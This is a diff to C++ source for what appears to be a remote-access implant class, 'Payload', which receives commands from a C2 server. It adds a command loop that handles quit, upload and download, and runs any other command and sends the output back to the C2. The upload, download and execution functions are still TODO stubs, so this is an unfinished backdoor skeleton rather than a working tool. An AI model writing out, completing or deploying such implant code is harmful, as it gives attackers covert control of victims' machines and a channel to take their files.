@@ -63,12 +63,47 @@ void Payload::handleConnection()
 
     while (true)
     {
-        // test communication
+        // get cmd from c2
         auto cmd = rcvMsg();
         std::cout << "[+] Got cmd from c2: " << cmd << std::endl;
-        std::cout << "[+] Sending response to c2\n";
-        sendMsg("helloWorld back");
-        break;
+
+        if (cmd == "quit")
+        {
+            std::cout << "[+] Quitting communication to c2 due to quit cmd.\n";
+            break;
+        }
+        else if (startsWith(cmd, "upload"))
+        {
+            auto tokens = tokenize(cmd);
+            if (tokens.size() == 3)
+            {
+                upload(tokens[1], tokens[2]);
+            }
+            else
+            {
+                std::cerr << "[-] Got invalid upload cmd.\n";
+            }
+        }
+        else if (startsWith(cmd, "download"))
+        {
+            auto tokens = tokenize(cmd);
+            if (tokens.size() == 3)
+            {
+                download(tokens[1], tokens[2]);
+            }
+            else
+            {
+                std::cerr << "[-] Got invalid download cmd.\n";
+            }
+        }
+        else
+        {
+            // execute cmd
+            std::cout << "[+] Executing due to server quit cmd.\n";
+            auto output = execCmd(cmd);
+            // and send to c2
+            sendMsg(output);
+        }
     }
 }
 
@@ -127,4 +162,20 @@ std::string Payload::rcvMsg()
         std::cerr << "[-] Error while reading from channel\n";
     }
     return std::string(buffer);
+}
+
+void Payload::upload(std::string& localFilePath, std::string& remoteFilePath)
+{
+    // TODO
+}
+
+void Payload::download(std::string& remoteFilePath, std::string& localFilePath)
+{
+    // TODO
+}
+
+std::string Payload::execCmd(std::string&)
+{
+    // TODO
+    return "";
 }
